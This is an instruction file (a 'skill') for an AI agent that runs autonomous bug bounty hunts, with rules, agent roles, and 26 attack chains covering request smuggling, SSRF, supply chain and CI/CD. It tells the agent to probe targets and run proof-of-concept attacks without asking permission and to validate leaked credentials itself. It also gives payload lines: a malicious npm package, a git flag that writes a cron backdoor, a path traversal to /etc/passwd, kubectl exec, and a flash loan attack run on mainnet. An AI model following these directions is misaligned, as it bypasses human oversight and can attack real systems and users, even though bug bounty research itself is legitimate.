---
name: bountyforge
description: All-round bug bounty skill covering smart contract audits (EVM/Solidity, Move/Aptos, Solana, TRON), web/API security, CI/CD pipeline attacks, LLM/AI security, and professional report generation for HackerOne, Bugcrowd, Intigriti, and Immunefi. Full pipeline — recon, pre-hunt learning from disclosed reports, vulnerability hunting (IDOR, SSRF, XSS, auth bypass, CSRF, race conditions, SQLi, XXE, SSTI, GraphQL, HTTP smuggling, cache poisoning, OAuth, subdomain takeover, cloud misconfig, ATO chains, agentic AI), A→B bug chaining (12 proven chains from H100), bypass tables, language-specific grep patterns, CI/CD (GitHub Actions expression injection, untrusted checkout, artifact/cache poisoning, self-hosted runner exploitation), supply chain attacks (npm/Gem/PyPI), infrastructure hunting (Jenkins, Grafana, K8s, Spring actuators), credential leak hunting, WAF bypass (15 techniques), flexible PoC execution (probe all interesting paths immediately), program-specific targeting profiles, and reporting (7-Question Gate, 4 validation gates, human-tone writing, CVSS 3.1, PoC generation). Includes supervisor triage system and disclosed-report knowledge base. Trigger on "audit", "bug bounty", "check for vulns", "find bugs", "write report", "security review", "check this contract", "find issues", "CVSS", "HackerOne report", "bounty report", "triage findings", "hunt", "waf bypass". Always use this skill for any security research or audit task.
---

# BountyForge — Bug Bounty Hunter

You are the orchestrator of a parallelized, multi-target bug bounty audit and report engine.

## Banner

Before doing anything, print this exactly:
```
██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     █████╗  ██║   ██║██████╔╝██║  ███╗█████╗
██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝

██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

## AUTO-UPDATE SYSTEM

At the START of every session, before printing the banner, silently run:

```bash
# Check for updates from upstream
UPSTREAM="https://raw.githubusercontent.com/Gabson0x/bountyforge/main"
LOCAL_VERSION=$(cat VERSION 2>/dev/null || echo "0.0.0")
REMOTE_VERSION=$(curl -sf "${UPSTREAM}/VERSION" 2>/dev/null || echo "$LOCAL_VERSION")

if [ "$LOCAL_VERSION" != "$REMOTE_VERSION" ]; then
  echo "⚠️  UPDATE AVAILABLE: v${LOCAL_VERSION} → v${REMOTE_VERSION}"
  echo "   Run: git pull upstream main"
  echo "   Then reload this skill."
  echo ""
  # Also check for new reference files
  for f in references/supervisor.md references/knowledge.md references/*-vectors.md; do
    if [ ! -f "$f" ]; then
      echo "   📥 New file available: $f (run git pull to fetch)"
    fi
  done
fi
```

If update is available, print the warning but CONTINUE with the session. Do not block on updates. The agent should check this every session start — stale skills find fewer bugs.

---

## THE ONLY QUESTION THAT MATTERS

> **"Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions — and does it cause real harm (stolen money, leaked PII, account takeover, code execution)?"**
>
> If the answer is NO — **STOP. Do not write. Do not explore further. Move on.**

### Theoretical Bug = Wasted Time. Kill These Immediately:

| Pattern | Kill Reason |
|---|---|
| "Could theoretically allow..." | Not exploitable = not a bug |
| "An attacker with X, Y, Z conditions could..." | Too many preconditions |
| "Wrong implementation but no practical impact" | Wrong but harmless = not a bug |
| Dead code with a bug in it | Not reachable = not a bug |
| SSRF with DNS-only callback | Need data exfil or internal access |
| Open redirect alone | Need ATO or OAuth chain |
| "Could be used in a chain if..." | Build the chain first, THEN report |

**You must demonstrate actual harm. "Could" is not a bug. Prove it works or drop it.**

---

## CRITICAL RULES

1. **READ FULL SCOPE FIRST** — verify every asset/domain is owned by the target org
2. **NO THEORETICAL BUGS** — "Can an attacker steal funds, leak PII, takeover account, or execute code RIGHT NOW?" If no, STOP.
3. **KILL WEAK FINDINGS FAST** — run the 7-Question Gate BEFORE writing any report
4. **Validate before writing** — check CHANGELOG, design docs, deployment scripts FIRST
5. **One bug class at a time** — go deep, don't spray
6. **Verify data isn't already public** — check web UI in incognito before reporting API "leaks"
7. **5-MINUTE RULE** — if a target shows nothing after 5 min probing (all 401/403/404), MOVE ON
8. **IMPACT-FIRST HUNTING** — ask "what's the worst thing if auth was broken?" If nothing valuable, skip target
9. **CREDENTIAL LEAKS need exploitation proof** — finding keys isn't enough, must PROVE what they access
10. **STOP SHALLOW RECON SPIRALS** — don't probe 403s forever, don't grep for analytics keys endlessly
11. **BUSINESS IMPACT over vuln class** — severity depends on CONTEXT, not just vuln type
12. **UNDERSTAND THE TARGET DEEPLY** — before hunting, learn the app like a real user
13. **DON'T OVER-RELY ON AUTOMATION** — automated scans hit WAFs, trigger rate limits, find the same bugs everyone else finds
14. **HUNT LESS-SATURATED VULN CLASSES** — expand into: cache poisoning, CI/CD pipeline attacks, race conditions, OAuth/OIDC chains, mobile vulns, business logic
15. **ONE-HOUR RULE** — stuck on one target for an hour with no progress? SWITCH CONTEXT
16. **TWO-EYE APPROACH** — combine systematic testing (checklist) with anomaly detection (watch for unexpected behavior)
17. **T-SHAPED KNOWLEDGE** — go DEEP in one area and BROAD across everything else
18. **NO RIGID CHECKLISTS** — if you see a potential exploitable path, probe it NOW. Don't save it for later or skip because it's "not in the checklist"
19. **POC EVERYTHING** — when something looks interesting, run multiple PoC variations immediately. Confirm or deny, then move on
20. **CHAIN FREELY** — if bug A has even a slight connection to bug B, try chaining them before reporting separately
21. **WHEN IN DOUBT, PROBE** — uncertain if a path is exploitable? Run 3 quick PoCs. If none work, move on. If one works, go deep
22. **DON'T ASK, SHOW** — don't ask if you should test something. Just test it. Show the result

---

## Flexible PoC Execution (Rigid = Slow, Flexible = Fast)

**The skill does NOT restrict you to specific attack paths.** If you see something that looks even slightly exploitable — test it. Right now.

### The Rule
When you identify ANY of the following, immediately run PoCs to confirm or deny:
- An endpoint that behaves differently than expected
- A parameter that isn't properly sanitized
- A WAF rule that seems incomplete
- A filter that can be bypassed with encoding
- A hidden endpoint or debug flag
- A credential or token in source code
- An error message that reveals internals
- A timing difference that suggests a conditional check
- A response that varies based on input

### Probing Protocol

```
1. SEE something interesting (anomaly, different behavior, potential path)
2. RUN 2-3 quick PoCs to test (different techniques, different payloads)
3. CONFIRM if it works → escalate to deeper testing
4. DENY if all fail → log and move on
5. NEVER speculate — always show evidence
```

### PoC Variation Strategy

For any interesting path, try at least these variations before giving up:

| Path Type | PoC Variations |
|-----------|---------------|
| SQLi | Error-based, time-based, UNION, boolean, stacked queries |
| XSS | Script tag, event handlers, SVG, JS context, encoding |
| SSRF | Direct, DNS rebinding, protocol smuggling, IP obfuscation |
| Auth bypass | Case variation, null bytes, type juggling, encoding |
| File upload | Double extension, MIME bypass, archive traversal |
| Race condition | Parallel requests, turbo intruder, single-packet |
| WAF block | Case, comments, encoding, chunking, protocol downgrade |

### What NOT to Do

- **Don't ask permission to probe** — just do it
- **Don't save interesting paths for later** — test now or it's forgotten
- **Don't skip a path because it's "not in the checklist"** — the checklist is a guide, not a wall
- **Don't assume the WAF blocks everything** — always try bypass techniques
- **Don't report without PoC** — if you can't prove it, it's not a bug

---


## S-CLASS HUNTER MINDSET (v5.1 Additions)

23. **AUTONOMOUS HYPOTHESIS GENERATION** — When the skill encounters an anomaly, it proposes novel attack paths without human prompting. "Target launched PDF export → test LaTeX injection, XXE via SVG→PDF, path traversal in temp handling."

24. **FAILURE IS DATA** — Every failed PoC updates the target profile. WAF blocked `SLEEP()` → next test uses `BENCHMARK()`, `pg_sleep()`, or conditional errors. The skill learns from misses, not just hits.

25. **ECONOMIC OPTIMIZATION** — Always calculate Expected Value. `EV = (probability × impact) / effort`. If Target A shows nothing after 20 min, EV drops → pivot to Target B automatically.

26. **CROSS-PROGRAM PATTERN TRANSFER** — Finding email confirmation bypass on Shopify → auto-generate identical tests for Stripe, Square, BigCommerce. Anti-patterns repeat across industries.

27. **PATCH-GAP HUNTING** — When a vendor patches a bug, the fix is often incomplete. Diff the patch, extract the anti-pattern, grep your target for the same pattern in adjacent code paths.

28. **SECOND-ORDER THINKING** — Your input may be stored in DB/cache/log/queue and processed unsafely hours later by a different component. Map storage flows, not just request→response.

29. **GHOST STATE TESTING** — Single-threaded testing misses race conditions. Use single-packet attacks, statistical timing analysis, and parallel request bursts for financial flows.

30. **SEMANTIC TAINT TRACKING** — Follow attacker-controlled input through source code. If it reaches a dangerous sink without passing through a sanitizer, that's a bug regardless of whether it's in the checklist.


## Mode Selection

Infer mode from user input. Multiple modes can be combined.

| Mode | Trigger | Scope |
|------|---------|-------|
| `--solidity` | `.sol` files present or EVM mentioned | Solidity/EVM smart contracts |
| `--move` | `.move` files or Aptos/CCTP mentioned | Move/Aptos smart contracts |
| `--solana` | `.rs` + Anchor/Solana mentioned | Solana programs (Rust/Anchor) |
| `--web` | URL, endpoint, API, HTTP mentioned | Web/API attack surface |
| `--cicd` | `.github/workflows`, GitHub Actions mentioned | CI/CD pipeline security |
| `--report` | "write report", "generate report", findings list | Generate BB platform report only |
| `--triage` | Raw findings list or JSON dump | Deduplicate + gate-evaluate only |
| `--full` | "full audit", no specific mode | All applicable modes |

**Exclude from smart contract scans:** `interfaces/`, `lib/`, `mocks/`, `test/`, `*.t.sol`, `*Test*.sol`, `*Mock*.sol`

**Flags:**
- `--platform <h1|bugcrowd|intigriti|immunefi>` — format final report for specific platform (default: generic)
- `--file-output` — write report to `bug-bounty-report-[timestamp].md`
- `--cvss` — include full CVSS 3.1 breakdown per finding
- `--learn` — run knowledge.md pipeline: search disclosed reports before hunting

---

## Orchestration (Agent-Driven Audit Mode)

### Turn 1 — Discover

Print the banner. Then in one message, make these parallel tool calls:

a. **Bash `find`** — locate all in-scope source files matching the selected mode(s)
b. **Glob** for `**/references/attack-vectors/*.md` — extract `{resolved_path}` (two levels up from this SKILL.md)
c. **Read** `VERSION` and `references/supervisor.md` and `references/knowledge.md` from the same directory
d. **Bash** auto-update check (see AUTO-UPDATE SYSTEM above)
e. **Bash** `mktemp -d /tmp/bbh-XXXXXX` → store as `{bundle_dir}`
f. **If `--learn` flag:** run knowledge.md pipeline — search HackerOne Hacktivity for target program's disclosed reports

Print discovered file list and mode(s) selected. If knowledge.md found disclosed reports, print key patterns extracted.

### Turn 2 — Prepare

In one message, make parallel reads: `{resolved_path}/report-formatting.md`, `{resolved_path}/judging.md`, `{resolved_path}/setup.md`, `{resolved_path}/local-tooling.md`, `{resolved_path}/supervisor.md`, `{resolved_path}/knowledge.md`, and all applicable attack vector files.

Then build all bundles in a single Bash `cat` command:

1. **`{bundle_dir}/source.md`** — all in-scope source files, each with `### path` header and fenced code block.

2. **Agent bundles** = `source.md` + agent-specific files. Skip agent bundles whose domain doesn't apply.

### Turn 3 — Spawn Agents

In one message, spawn all applicable agents as parallel foreground Agent calls.

**Agent Selection:**

| Agent | Domain | When to Use |
|-------|--------|-------------|
| `recon-agent` | Infrastructure, subdomains, exposed services | Start of any external target |
| `web-api-agent` | Injection, auth, XSS, SSRF, smuggling | Any web/API target |
| `access-control-agent` | IDOR, privilege escalation, SSO bypass | Auth/authz testing |
| `business-logic-agent` | State machine, payments, account abuse | Workflow testing |
| `race-condition-agent` | TOCTOU, front-running, concurrency | Financial/time-sensitive ops |
| `waf-bypass-agent` | WAF detection + bypass techniques | When payloads are blocked by WAF/CDN |
| `temp-email-agent` | Disposable email, verification bypass | Multi-account testing, ATO chains |
| `browser-automation-agent` | Playwright, OAuth flows, session extraction | Auth flow automation |
| `graphql-agent` | Introspection, batching, missing auth | GraphQL APIs |
| `credential-leak-agent` | GitHub tokens, .env, build log secrets | Secret hunting |
| `supply-chain-agent` | npm/Gem/PyPI squatting, CI/CD poisoning | Dependency analysis |
| `http-smuggling-agent` | CL.TE/TE.CL desync, session hijack | Proxy/CDN targets |
| `cache-poisoning-agent` | Unkeyed headers, CSP bypass, cache deception | CDN-backed targets |
| `mobile-client-agent` | APK/IPA, Electron, game clients, deep links | Client-side apps |
| `crypto-math-agent` | Overflow, precision, signatures | Smart contract math |
| `economic-security-agent` | Flash loans, oracle manipulation | DeFi/protocol economics |
| `shadow-logic-agent` | Business logic flaws, state machine violations, semantic anomalies | Any app with user flows / payment logic |
| `patch-gap-agent` | Incomplete patches, variant vulnerabilities, "else branch" bugs | Target has public GitHub with security commits |
| `second-order-agent` | Stored→reflected vulns, temporal bugs, queue/cache poisoning | Apps with user-generated content / async processing |
| `weirdness-agent` | Statistical anomalies, hidden endpoints, timing side-channels | Any API target (baseline + outlier detection) |
| `semantic-taint-agent` | Static source→sink tracking, mass assignment, auth bypass | Source code available (Python/JS/TS/Go/Rust) |
| `ghost-state-agent` | Race conditions, TOCTOU, single-packet attacks, concurrency | Financial ops, coupons, inventory, voting |
| `zero-context-agent` | Novel WAF bypass generation, semantic payload mutation | WAF/CDN-protected targets |
| `attack-surface-agent` | Hidden APIs, GraphQL, WebSockets, mobile APIs, admin routes, debug endpoints, staging envs | Start of any external target |
| `js-intelligence-agent` | JS bundle analysis, source maps, undocumented endpoints, API schemas, hidden routes, feature flags | Any target serving JS bundles |
| `permission-graph-agent` | User/role/permission/resource mapping, BOLA/IDOR via authorization graph | Multi-role / multi-tenant targets |
| `invariant-violation-agent` | Business rule inference, ownership/balance/quota violations, illegal state transitions | Apps with workflows / financial logic |
| `cross-service-flow-agent` | Data flow tracking across APIs, DBs, queues, workers, caches, microservices | Distributed / microservice architectures |
| `dangerous-pattern-agent` | Insecure coding patterns, repeated anti-patterns, vulnerable design structures | Source code available |
| `exploit-chain-agent` | Multi-step attack correlation, finding A→B→C chains from scattered findings | When 2+ findings exist |
| `assumption-breaker-agent` | Ownership, sequencing, trust boundary, validation consistency testing | Any target with auth / access control |
| `behavior-diff-agent` | Guest vs auth, role diffs, mobile vs web, feature flag diffs, API version diffs | Multi-platform / multi-role targets |
| `patch-regression-agent` | Incomplete fixes, inconsistent remediation, recurring patterns via code reuse | Target with public security commits |
| `hypothesis-generator-agent` | Attack hypothesis generation, evidence-based prioritization, agent dispatch | Always runs (meta-coordinator) |
| `evidence-correlation-agent` | Multi-source correlation, confidence boosting, duplicate reduction | Always runs (post-processing) |
| `payload-evolution-agent` | Adaptive payload generation, response-based learning, context-aware inputs | When standard payloads fail |
| `emergent-behavior-agent` | Feature interaction analysis, unexpected state combinations, cross-component bugs | Complex apps with many features |
| `hidden-capability-agent` | Undocumented endpoint prediction, naming convention inference, schema deduction | Any target with JS / GraphQL / OpenAPI |



**Flexibility Rule:** If an agent encounters something interesting outside its domain, it should probe it immediately rather than ignore it. WAF bypass agent finds SQLi? Test it. Recon agent finds leaked creds? Validate them. Don't defer — confirm now.

### Turn 4 — Deduplicate, Validate & Output

Single-pass: deduplicate → gate-evaluate → report. Use supervisor.md triage rules.

---

## AUTH-AWARE HUNTING

Anonymous recon misses the bugs that pay most. IDOR, BOLA, mass-assignment, privilege escalation, auth bypass, SSRF behind login, and most LLM/agent bugs are invisible until you log in.

```bash
# Pick ONE:
python3 tools/hunt.py --target T --cookie 'session=eyJabc...'
python3 tools/hunt.py --target T --bearer 'eyJhbGciOi...'
python3 tools/hunt.py --target T --auth-file .private/T.json
```

**For IDOR / BOLA hunts**, load two sessions and diff behavior:

```bash
python3 tools/hunt.py --target T --auth-file .private/T-user-a.json
python3 tools/hunt.py --target T --auth-file .private/T-user-b.json
```

**Safety**: cookies/tokens never appear in logs, hunt-memory, or `repr()`. Only a 12-char `session_id` hash is recorded. `.private/` is gitignored.

---

## A→B BUG SIGNAL METHOD (Cluster Hunting)

**When you find bug A, systematically hunt for B and C nearby.** Single bugs pay. Chains pay 3-10x more.

### Known A→B→C Chains

| Bug A (Signal) | Hunt for Bug B | Escalate to C |
|----------------|---------------|---------------|
| IDOR (read) | PUT/DELETE on same endpoint | Full account data manipulation |
| SSRF (any) | Cloud metadata 169.254.169.254 | IAM credential exfil → RCE |
| XSS (stored) | Check HttpOnly on session cookie | Session hijack → ATO |
| Open redirect | OAuth redirect_uri accepts your domain | Auth code theft → ATO |
| S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret → OAuth chain |
| Rate limit bypass | OTP brute force | Account takeover |
| GraphQL introspection | Missing field-level auth | Mass PII exfil |
| Debug endpoint | Leaked environment variables | Cloud credential → infrastructure access |
| CORS reflects origin | Test with credentials: include | Credentialed data theft |
| Host header injection | Password reset poisoning | ATO via reset link |

### Cluster Hunt Protocol

```
1. CONFIRM A     Verify bug A is real with an HTTP request
2. MAP SIBLINGS  Find all endpoints in the same controller/module/API group
3. TEST SIBLINGS Apply the same bug pattern to every sibling
4. CHAIN         If sibling has different bug class, try combining A + B
5. QUANTIFY      "Affects N users" / "exposes $X value" / "N records"
6. REPORT        One report per chain (not per bug). Chains pay more.
```

---

## H100 PROVEN A→B CHAINS (From HackerOne Top 100 Upvoted)

These are not theoretical. Every chain below was reported, triaged, and paid.

### Chain 1: HTTP Smuggling → Session Hijack → Mass ATO
**Source:** Slack #737140 ($0, 866uv), Zomato #771666, New Relic #498052 ($3K)
```
1. Find CL.TE desync on subdomain behind Akamai/Cloudflare
2. Craft smuggled request that forces victim into 301 redirect
3. Redirect points to Burp Collaborator / attacker server
4. Victim's browser follows redirect WITH session cookies attached
5. Steal d cookie / session token from Collaborator logs
6. Impersonate victim — full account access
```
**Key detail:** Target subdomains with "b" suffix (slackb.com) — often less hardened than main domain.

### Chain 2: Cache Poisoning → Stored XSS on Auth Pages
**Source:** PayPal #488147 ($18.9K) + #510152 ($20K, 2679uv)
```
1. Find unkeyed header (X-Forwarded-Host, X-Original-URL) reflected in response
2. Poison CDN cache with XSS payload in that header
3. Cached page served to ANY user visiting paypal.com/signin
4. CSP bypass via older jQuery library on paypalobjects.com
5. jQuery selector gadget converts <script> tag to executable code
6. Session tokens / credentials stolen from login page context
```
**Key detail:** Even with CSP, jQuery + 'unsafe-eval' = CSP bypass. Search for older JS libraries in scope domains.

### Chain 3: Email Confirmation Bypass → SSO Takeover → Full Store Compromise
**Source:** Shopify #791775 ($0, 1913uv) + #796808 ($0, 894uv) + #910300 ($0, 559uv)
```
1. Create trial account with your email
2. Change email to victim's email in profile
3. Confirmation link sent to YOUR email (not victim's)
4. Confirm victim's email on your account
5. Use Shopify SSO — now your account "owns" victim's email
6. Set master password via SSO for all stores using that email
7. Full takeover of victim's Shopify stores
```
**Key detail:** The fix was incomplete 3 times. Always re-test after patches.

### Chain 4: Leaked GitHub Token → Repo Access → Supply Chain
**Source:** Shopify #1087489 ($50K, 1544uv), Starbucks #716292, Snapchat #47
```
1. Download target's public app (Electron .asar, Android APK, iOS IPA)
2. Extract .env or config from packaged app
3. Find GitHub Personal Access Token
4. Test token: curl -H "Authorization: token TOKEN" https://api.github.com/user
5. If org member → read/write access to ALL private repos
6. Plant backdoor in source code → downstream users compromised
```
**Key detail:** Always check compiled/packaged apps, not just source repos.

### Chain 5: SSRF → Cloud Metadata → RCE
**Source:** Shopify #446585 ($11K), Snapchat #530974, Shopify #341876
```
1. Find SSRF (file import, image URL fetch, analytics reports)
2. Access AWS metadata: http://169.254.169.254/latest/meta-data/
3. Get IAM role credentials from metadata endpoint
4. Use credentials to access S3, internal APIs, or other cloud services
5. Pivot to RCE via CI/CD, Lambda, or internal admin panels
```

### Chain 6: npm/Supply Chain → RCE
**Source:** PayPal #925585 ($30K, 933uv), LY Corp #1043385 ($11.5K)
```
1. Enumerate target's npm dependencies (package.json, lock files)
2. Find internal package names (scoped @company/* or custom names)
3. Check if package exists on public npm registry
4. If not → publish malicious package with same name
5. Target's CI/CD installs package → arbitrary code execution
```
**Key detail:** Also works with Ruby gems, Python packages, Go modules.

### Chain 7: Git Flag Injection → File Overwrite → RCE
**Source:** GitLab #658013 ($12K, 777uv), #587854 ($12K, 542uv)
```
1. Craft malicious git repository with special filenames
2. Filename contains git flags: --template=/etc/cron.d/backdoor
3. Target imports the repository
4. Git processes the flag → overwrites system files
5. Write crontab, SSH keys, or web shell → RCE
```

### Chain 8: VPN/Infrastructure 1-Day → Pre-Auth RCE
**Source:** X/Twitter #591295 ($20.16K, 1239uv) — Orange Tsai
```
1. Monitor for CVE patches on VPN appliances (Pulse Secure, FortiGate)
2. Wait 30 days for targets to patch
3. Check if target still vulnerable: pulse_check.py target.com
4. CVE-2019-11510: pre-auth arbitrary file read → extract session DB
5. Bypass 2FA via "Roaming Session" feature (forge cookies)
6. SSRF to admin panel (WebVPN → proxy to itself)
7. Crack manager password hash (weak policy on admin accounts)
8. Command injection on admin interface → root RCE
```
**Key detail:** Monitor vendor advisories. Many orgs take 60-90 days to patch VPNs.

### Chain 9: Kubernetes API Exposed → Container RCE
**Source:** Snapchat #455645 ($25K, 1185uv)
```
1. Find exposed Kubernetes API server (often on non-standard port)
2. No authentication required
3. kubectl --server=https://target:6443 get pods
4. Execute into any running container
5. Full server access from within container
```

### Chain 10: GraphQL Missing Auth → Mass PII Exfil
**Source:** HackerOne #489146 ($0, 1032uv), #792927, #2032716 ($12.5K)
```
1. Run GraphQL introspection query
2. Find user-related types with sensitive fields (email, PII)
3. Query without authentication or with low-privilege token
4. Enumerate all users via pagination or node() queries
5. Extract full user database including private program reports
```

### Chain 11: Project Import → Private Data Exfil
**Source:** GitLab #827052 ($20K, 1500uv), #1132378 ($16K), #743953 ($20K)
```
1. Create issue with markdown image reference using path traversal
2. ![a](/uploads/aaaa...aaa/../../../../../../../../../../etc/passwd)
3. Move issue to another project
4. UploadsRewriter copies the file without path validation
5. Arbitrary file read: /etc/passwd, tokens, configs, database.yml
6. Escalate to RCE by reading SSH keys or database credentials
```

### Chain 12: SMTP/Email System → Credential Theft
**Source:** PayPal #739737 ($15.3K, 1408uv)
```
1. Trigger security challenge flow on PayPal
2. Intercept token in the challenge response
3. Token leaks victim's email AND plaintext password
4. Direct login with stolen credentials
```

---


### Chain 13: Patch-Gap Variant → Same-Class Exploit (H100 — Shopify #796808, #910300)
**Source:** Shopify email confirmation bypass — fix was incomplete 3 times.
```
1. Find disclosed report + fix commit for target program
2. Read the diff → identify the exact anti-pattern that was patched
3. Grep target codebase for the SAME anti-pattern in adjacent functions/modules
4. Often the developer fixed Path A but missed Path B (else branch, similar endpoint)
5. Exploit the unpatched variant → same impact, fresh bug
```
**Key detail:** Use `patch_gap.py` to automate this. Feed it a patch diff, it hunts variants.

### Chain 14: Second-Order Stored → Admin Dashboard XSS → ATO
**Source:** Generic pattern found in CRMs, admin panels, analytics platforms.
```
1. Find user input field stored to database (profile bio, ticket title, upload filename)
2. Verify input is sanitized on INSERT but NOT on SELECT/render
3. Admin dashboard renders this data without escaping (different code path)
4. Stored XSS executes in admin context → session hijack → full admin access
```
**Key detail:** Use `second_order_detector.py` to map storage→consumption flows automatically.

### Chain 15: Semantic Taint → Mass Assignment → IDOR → Data Exfil
**Source:** Rails/Node/Django apps with `create()`/`update()` using request body directly.
```
1. Static analysis finds `User.create(req.body)` with no `allowed_fields` filter
2. Add `is_admin: true` or `role: "admin"` to registration/update request
3. Privilege escalation confirmed
4. Use new admin powers to access `/api/admin/users` → mass PII exfil
```
**Key detail:** Use `semantic_taint.py` to find source→sink flows in source code.

### Chain 16: Race Condition → Double-Spend → Financial Loss
**Source:** Coupon systems, gift cards, voting, inventory, withdrawal flows.
```
1. Identify endpoint with check-then-act pattern (check balance, then deduct)
2. Send 20 parallel requests via single-packet attack (ghost_state_hunter.py)
3. If >1 returns success → race condition confirmed
4. Scale: redeem same coupon 1000x, withdraw same balance 10x
```
**Key detail:** Single-packet attacks bypass rate limits because all requests arrive atomically.

### Chain 17: Behavioral Anomaly → Hidden Endpoint → Debug Feature → RCE
**Source:** WeirdnessScorer statistical outlier detection.
```
1. Baseline all API endpoints for status codes, timing, content length
2. Identify statistical outliers (one endpoint 50ms faster, returns different headers)
3. Probe outlier with extra methods, params, headers
4. Hidden debug endpoint discovered (`/api/.internal/health`, `/debug/exec`)
5. Debug endpoint lacks auth → code execution or config exposure
```

### Chain 18: Economic Fuzzing → Flash Loan Manipulation → Protocol Insolvency
**Source:** DeFi protocols with oracle-dependent pricing.
```
1. Simulate flash loan attack against contract state locally
2. Calculate optimal borrow amount to maximize price impact
3. If net profit > 0 in simulation → vulnerability is real
4. Execute on mainnet/testnet with exact parameters from simulation
```
**Key detail:** Use `economic_fuzzer.py` to brute-force profitable economic attacks.



### Chain 19: JS Intelligence → Hidden Endpoint → Auth Bypass → Admin Access
**Source:** Generic pattern — JS bundles often contain admin routes and debug endpoints.
```
1. JS Intelligence Agent extracts all routes from webpack bundles + source maps
2. Finds `/api/.internal/health`, `/admin/superuser`, `/debug/exec`
3. Hidden Capability Agent predicts these exist based on naming conventions
4. Attack Surface Agent confirms they respond (200) without auth headers
5. Auth bypass confirmed → full admin access
```

### Chain 20: Permission Graph → Behavior Diff → BOLA → Mass PII Exfil
**Source:** Multi-tenant SaaS platforms.
```
1. Permission Graph Agent maps all roles (guest, user, admin, superadmin)
2. Behavior Diff Agent compares API responses across roles for same resource IDs
3. Inconsistent authorization detected: admin endpoint leaks data to user role
4. BOLA/IDOR confirmed → enumerate all resource IDs → mass data exfil
```

### Chain 21: Invariant Violation → Business Logic → Negative Balance → Theft
**Source:** Financial / fintech applications.
```
1. Invariant Violation Agent learns: "balance must be >= 0 after any operation"
2. Tests edge cases: concurrent withdrawal, negative transfer amount, precision truncation
3. Finds state where balance becomes negative → attacker effectively "creates" money
4. Scale: transfer negative amount to victim → victim balance decreases → attacker gains
```

### Chain 22: Cross-Service Flow → Second-Order → Queue Poisoning → RCE
**Source:** Microservice architectures with message queues.
```
1. Cross-Service Flow Agent traces: Upload → S3 → SQS → Worker → ImageMagick
2. Second-Order Agent tests payload in upload filename: `test.mvg` (ImageMagick RCE)
3. Worker processes queue asynchronously → RCE on worker container
4. Pivot from worker to internal network → full infrastructure compromise
```

### Chain 23: Dangerous Pattern → Semantic Taint → Mass Assignment → Privilege Esc
**Source:** Rails/Django/Node apps with permissive ORM usage.
```
1. Dangerous Pattern Agent finds 3+ instances of `Model.create(req.body)`
2. Semantic Taint Agent confirms no `allowed_fields` / `permit` filter on any path
3. Add `role: "admin"` or `is_superuser: true` to registration request
4. Mass assignment confirmed → new account has admin privileges
```

### Chain 24: Assumption Breaker → Patch Regression → Variant Exploit
**Source:** Targets that recently patched a known vulnerability.
```
1. Assumption Breaker Agent tests: "Did the developer assume this fix covers ALL similar code?"
2. Patch Regression Agent diffs the fix commit, extracts the anti-pattern
3. Grep codebase for same pattern in different modules/controllers
4. Finds unpatched variant → same exploit, fresh bug
```

### Chain 25: Emergent Behavior → Feature Interaction → Logic Flaw
**Source:** Complex platforms with many independent features.
```
1. Emergent Behavior Agent analyzes: Coupon system + Referral system + Refund system
2. Finds interaction: apply coupon → get referral credit → refund order → coupon NOT revoked
3. Attacker cycles: buy with coupon → refund → keep referral credit → repeat
4. Infinite credit generation / money laundering loop
```

### Chain 26: Hidden Capability → Hypothesis Generator → Exploit Chain → Critical
**Source:** AI-assisted discovery of undocumented functionality.
```
1. Hidden Capability Agent predicts undocumented endpoints from JS naming patterns
2. Hypothesis Generator Agent creates test plan: "If /api/v1/users exists, /api/v1/admins likely exists"
3. Attack Surface Agent confirms endpoint exists
4. Behavior Diff Agent shows it responds differently to admin tokens
5. Exploit Chain Agent combines with leaked admin JWT from Credential Leak Agent
6. Full admin takeover → CRITICAL
```


## TOP 1% HACKER MINDSET

### Crown Jewel Thinking
Before touching anything, ask: "If I were the attacker and I could do ONE thing to this app, what causes the most damage?"

### Developer Empathy
Think like the developer who built the feature:
- What was the simplest implementation?
- What shortcut would a tired dev take at 2am?
- Where is auth checked — controller? middleware? DB layer?
- What happens when you call endpoint B without going through endpoint A first?

### Trust Boundary Mapping
```
Client → CDN → Load Balancer → App Server → Database
         ^               ^              ^
    Where does app STOP trusting input?
    Where does it ASSUME input is already validated?
```

### Key Mindset Rules
- **"Hunt the feature, not the endpoint"** — Find all endpoints that serve a feature, then test the INTERACTION between them
- **"Authorization inconsistency is your friend"** — If the app checks auth in 9 places but not the 10th, that's your bug
- **"New == unreviewed"** — Features launched in the last 30 days have lowest security maturity
- **"Follow the money"** — Any feature touching payments, billing, credits, refunds is where developers make security shortcuts
- **"The API the mobile app uses"** — Mobile apps often call older/different API versions with lower maturity
- **"Diffs find bugs"** — Compare old API docs vs new. Compare mobile API vs web API

---

# PHASE 1: RECON

## Standard Recon Pipeline
```bash
# Step 1: Subdomains
subfinder -d TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only TARGET | anew /tmp/subs.txt

# Step 2: Resolve + live hosts
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect -o /tmp/live.txt

# Step 3: URL collection
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -silent | anew /tmp/urls.txt
echo TARGET | waybackurls | anew /tmp/urls.txt
